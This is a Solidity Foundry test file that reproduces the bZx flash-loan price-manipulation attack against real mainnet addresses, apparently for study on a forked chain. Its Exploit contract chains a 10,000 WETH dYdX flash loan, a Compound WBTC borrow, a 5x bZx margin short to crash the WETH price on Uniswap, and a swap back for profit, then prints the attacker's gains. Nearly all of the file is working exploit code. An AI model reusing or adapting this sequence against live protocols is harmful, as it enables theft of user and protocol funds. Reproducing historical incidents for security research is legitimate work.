// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";

import "../src/interfaces/dydx/ICallee.sol";
import "../src/interfaces/dydx/IWETH.sol";
import "../src/utils/converter.sol";
import "../src/contracts/DyDxFlashLoanBase.sol";
import "../src/interfaces/compound/ICompound.sol";
import "../src/interfaces/Uniswap/IUniswapExchange.sol";


string constant SEP = "\n---------------------------------------";
contract Exploit is ICallee, DyDxFlashLoanBase {
    address private constant SOLO = 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e;

    address constant internal WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant internal CWETH_ADDRESS = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;
    address constant internal WBTC_ADDRESS = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant internal CWBTC_ADDRESS = 0xC11b1268C1A384e55C48c2391d8d480264A3A7F4;

    address constant CompoundComptrollerAddress = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;
    address constant PrizeFeedOracle = 0x1D8aEdc9E924730DD3f9641CDb4D1B92B848b4bd;

    address public owner;

    struct MyCustomData {
        address token;
        uint repayAmount;
    }
    constructor() {
        owner = msg.sender;
    }

    receive() external payable {
        console2.log("Funds received in receive()...");
    }
    fallback() external payable {
        console2.log("Funds received in fallback()...");
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "!owner");
        _;
    }

    function displaybalances(address addr) public view {
        console2.log("============Balances of all tokens==================");
        console2.log("ETH(attacker)           =", Converter.toRepr(owner.balance, 18));
        console2.log("ETH(exploit contract)   =", Converter.toRepr(addr.balance, 18));
        console2.log("WETH(exploit contract)  =", Converter.toRepr(IERC20(WETH_ADDRESS).balanceOf(addr), 18));
        console2.log("cWETH(exploit contract) =", Converter.toRepr(IcETH(CWETH_ADDRESS).balanceOf(addr), 18));
        console2.log("WBTC(exploit contract)  =", Converter.toRepr(IERC20(WBTC_ADDRESS).balanceOf(addr), 8));
        console2.log("cWBTC(exploit contract) =", Converter.toRepr(IcERC20(CWBTC_ADDRESS).balanceOf(addr), 8));
        console2.log("====================================================");
    }
    function initiateFlashLoan(address _token, uint _amount) external {
        ISoloMargin solo = ISoloMargin(SOLO);
        uint marketId = _getMarketIdFromTokenAddress(SOLO, _token);

        // Calculate repay amount (_amount + (2 wei))
        uint repayAmount = _getRepaymentAmountInternal(_amount);
        IERC20(_token).approve(SOLO, repayAmount);

        Actions.ActionArgs[] memory operations = new Actions.ActionArgs[](3);

        operations[0] = _getWithdrawAction(marketId, _amount);
        operations[1] = _getCallAction(
                            abi.encode(MyCustomData({token: _token, repayAmount: repayAmount}))
                        );
        operations[2] = _getDepositAction(marketId, repayAmount);

        Account.Info[] memory accountInfos = new Account.Info[](1);
        accountInfos[0] = _getAccountInfo();

        solo.operate(accountInfos, operations);
    }    

    function callFunction(
        address sender,
        Account.Info memory,
        bytes memory data
    ) public override {
        require(msg.sender == SOLO, "!solo");
        require(sender == address(this), "!this contract");

        MyCustomData memory mcd = abi.decode(data, (MyCustomData));
        uint repayAmount = mcd.repayAmount;

        uint bal = IERC20(mcd.token).balanceOf(address(this)); 
        require(bal >= repayAmount, "bal < repay");

        console2.log("Flashloan of 10K WETH received");
        console2.log("Amount to repay for flashloan(WETH)", Converter.toRepr(repayAmount, 18));

        console2.log("Balances after flashloan:");
        displaybalances(address(this));        

        console2.log("Withdrawing 10K WETH to get 10K ETH...");
        IWETH(WETH_ADDRESS).withdraw(10000 ether);

        console2.log("Balances after 10K WETH withdrawal:");
        displaybalances(address(this));

        // 2. Supply 5500 ETH as collateral to Compound to get 112 WBTC. Dumping WETH prize
        console2.log("\n2) Supply 5500 ETH as collateral to Compound to get 112 WBTC. Dumping WETH prize");
        IcETH cEth = IcETH(CWETH_ADDRESS);
        IComptroller comptroller = IComptroller(CompoundComptrollerAddress);
        IPriceFeed priceFeed = IPriceFeed(PrizeFeedOracle);
        IcERC20 cWBTC_Token = IcERC20(CWBTC_ADDRESS);

        uint256 CWBTC_DECIMALS = 8;

        // Supply ETH as collateral, get cETH in return
        console2.log("Supplying 5500 ETH as collateral to get cETH in return...");
        cEth.mint{ value: 5500 ether, gas: 250000 }();

        // Enter the ETH market so you can borrow another type of asset
        address[] memory cTokens = new address[](2);
        cTokens[0] = CWETH_ADDRESS;
        cTokens[1] = CWBTC_ADDRESS;
        uint256[] memory errors = comptroller.enterMarkets(cTokens);
        if (errors[0] != 0) {
            revert("Comptroller.enterMarkets failed.");
        }

        // Get my account's total liquidity value in Compound
        console2.log("Accounts total liquidity value in compound:");
        (uint256 error2, uint256 liquidity, uint256 shortfall) = comptroller.getAccountLiquidity(address(this));
        
        require(error2 == 0, "Comptroller.getAccountLiquidity failed.");
        console2.log("Liquidity =", liquidity);
        console2.log("Shortfall =", shortfall);

        require(shortfall == 0, "account underwater");
        require(liquidity > 0, "account has excess collateral");

        // Get the collateral factor for our collateral
        // console2.log("Get collateral factor for our collateral(ETH)");
        // (,uint collateralFactorMantissa,) = comptroller.markets(CWETH_ADDRESS);
        // console2.log("ETH Collateral Factor =", collateralFactorMantissa); // divide it by 1e18 to get in %

        // Get the amount of underlying added to your borrow each block
        console2.log("Get the amount of underlying(cWBTC) added to your borrow each block");
        uint borrowRateMantissa = cWBTC_Token.borrowRatePerBlock();
        console2.log("Current Borrow Rate =", borrowRateMantissa);

        // Get the underlying price in USD from the Price Feed,
        // so we can find out the maximum amount of underlying we can borrow.
        console2.log("Calculate the max number of cWBTC we can borrow");
        uint256 underlyingPrice = priceFeed.getUnderlyingPrice(CWBTC_ADDRESS);
        console2.log("Underlying price of cWBTC(USD) =", underlyingPrice);
        console2.log("Underlying price of cWETH(USD) =", priceFeed.getUnderlyingPrice(CWETH_ADDRESS));
        uint256 maxBorrowUnderlying = liquidity / underlyingPrice;

        // Borrowing near the max amount will result
        // in your account being liquidated instantly
        console2.log("Maximum underlying(cWBTC) Borrow (borrow far less!) =", maxBorrowUnderlying);

        // Borrow underlying
        uint256 numUnderlyingToBorrow = 112 * 10 ** CWBTC_DECIMALS;

        // Borrow, check the underlying balance for this contract's address
        cWBTC_Token.borrow(numUnderlyingToBorrow);

        // Get the borrow balance
        uint256 borrows = cWBTC_Token.borrowBalanceCurrent(address(this));
        console2.log("Current underlying(cWBTC) borrow amount", Converter.toRepr(borrows, 8));
        console2.log("Balances after borrowing WBTC");
        displaybalances(address(this));
        console2.log("Balance of Underlying cETH =", Converter.toRepr(IcETH(CWETH_ADDRESS).balanceOfUnderlying(address(this)), 18));        
        
        // 3. Use bZx 5x margin to short WETH with 1300 WETH to dump the prize of WETH
        console2.log("\n3) Use bZx 5x margin to short WETH with 1300 WETH to dump the prize of WETH");
        address sETHwBTC5x = 0xb0200B0677dD825bb32B93d055eBb9dc3521db9D;
        (bool success,) = sETHwBTC5x.call{value: 1300 ether}(abi.encodeWithSignature("mintWithEther(address,uint256)", owner, 0));        
        require(success, "5x margin call failed...");
        console2.log("Balances after 5x margin trade on bZx");
        displaybalances(address(this));

        // 4. Since prize of WETH is dump so much, swap WBTC we got from step 2 to get more WETH
        console2.log("\n4) Since prize of WETH is dump so much, swap WBTC we got from step 2 to get more WETH");
        address WBTC2WETH_Pool_UniswapV1 = 0x4d2f5cFbA55AE412221182D8475bC85799A5644b;
        IERC20 wbtc = IERC20(WBTC_ADDRESS);
        console2.log("WBTC balance of exploit contract =", Converter.toRepr(wbtc.balanceOf(address(this)), 8));
        console2.log("WETH balance of exploit contract =", Converter.toRepr(IERC20(WETH_ADDRESS).balanceOf(address(this)), 18));
        
        console2.log("Approving WBTC/WETH pool of uniswap v1 to spend WBTC", Converter.toRepr(numUnderlyingToBorrow, 8));
        wbtc.approve(WBTC2WETH_Pool_UniswapV1, numUnderlyingToBorrow);
        console2.log("Swap WBTC for WETH");
        (success,) = WBTC2WETH_Pool_UniswapV1.call(abi.encodeWithSignature("tokenToEthSwapInput(uint256,uint256,uint256)", numUnderlyingToBorrow, 1, block.timestamp));
        require(success, "Swap WBTC -> WETH failed");
        console2.log("Balances after swap(WBTC -> WETH):");
        displaybalances(address(this));

        console2.log("\n5) Payback flashloan of 10K WETH + fee(2 wei)");
        console2.log("Depositing 10K ETH to WETH to pay flashloan");
        IWETH(WETH_ADDRESS).deposit{value: 10000 ether}();
        console2.log("Balances after deposite:");
        displaybalances(address(this));
    }

    function exploit() public {
        // 1. Get flashloan from DyDx of 10_000 WETH 
        console2.log("\n1) TAKE FLASHLOAN OF 10,000 WETH FROM DYDX...");
        uint256 balanceBefore = address(this).balance;
        this.initiateFlashLoan(WETH_ADDRESS, 10000 ether);
        
        console2.log("Balances after flashloan is paid");
        displaybalances(address(this));

        uint256 balanceAfter = address(this).balance;
        console2.log("\nArbitrage PROFIT in WETH =", Converter.toRepr(balanceAfter - balanceBefore, 18));

        console2.log("\nWe have 2 positions open in Compound (+5,500WETH/-112WBTC) and bZx (-4,337WETH/+51WBTC)");
        address WBTC2WETH_Pool_UniswapV1 = 0x4d2f5cFbA55AE412221182D8475bC85799A5644b;
        uint256 weth_price_wrt_btc = IUniswapExchange(WBTC2WETH_Pool_UniswapV1).getTokenToEthInputPrice(1 * 10**8);
        console2.log("Current prize of 1 WBTC in WETH =", Converter.toRepr(weth_price_wrt_btc, 18));
        
        uint256 weth_required_for_112wbtc = weth_price_wrt_btc * 112;

        console2.log("So Compound's position is benificial. We can take a flashloan of 112 WBTC with", Converter.toRepr(weth_required_for_112wbtc, 18), "WETH and close the position to get 5500 WETH back.");

        uint256 profit = balanceAfter - balanceBefore + (5500 ether)  - weth_required_for_112wbtc;
        console2.log("Total Profit for attacker will be", Converter.toRepr(profit, 18));
    }
}
contract DyDxHack is Test {
    Exploit exploit;
    address payable attacker;
    address constant internal WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function depositEthToPayFeeInWeth(address token) public payable {
        IWETH(token).deposit{value:msg.value}();
        IWETH(token).transfer(address(exploit), msg.value);
    }

    function setUp() public {
        attacker = payable(address(uint160(uint256(keccak256("bZx.attacker")))));
        vm.deal(attacker, 2 wei);
        vm.label(attacker, "Attacker");
        vm.prank(attacker);
        exploit = new Exploit();
        vm.label(address(exploit), "Exploit");        
    }

    function testExploit() public {
        vm.startPrank(attacker);
        vm.label(WETH_ADDRESS, "WETH Token");

        console2.log("Depositing 2 WEI in exploit contract to pay fee in WETH for flashloan");
        this.depositEthToPayFeeInWeth{value: 2 wei}(WETH_ADDRESS);

        console2.log("\nStarting attack....");
        exploit.exploit();
    }
}
